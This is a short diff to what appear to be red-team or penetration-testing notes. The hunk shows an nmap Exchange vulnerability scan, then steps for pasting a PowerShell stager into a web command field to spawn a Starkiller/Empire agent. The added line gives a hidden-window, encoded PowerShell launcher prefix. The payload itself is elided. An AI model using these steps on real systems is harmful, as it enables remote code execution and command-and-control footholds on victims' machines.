@@ -45,6 +45,7 @@ nmap --script http-vuln-exchange.nse mail.draconem.io
 1. Click Cmd command in the top navigation window. 
 2. Paste your PowerShell stager into Statements to spawn a new agent. 
 3. Click carried out and check starkiller for a new agent.
+**Remember:** The Statements field should start with `/c powershell -noP -sta -w 1 -enc ...`
 ### Enumerate Users
 
 
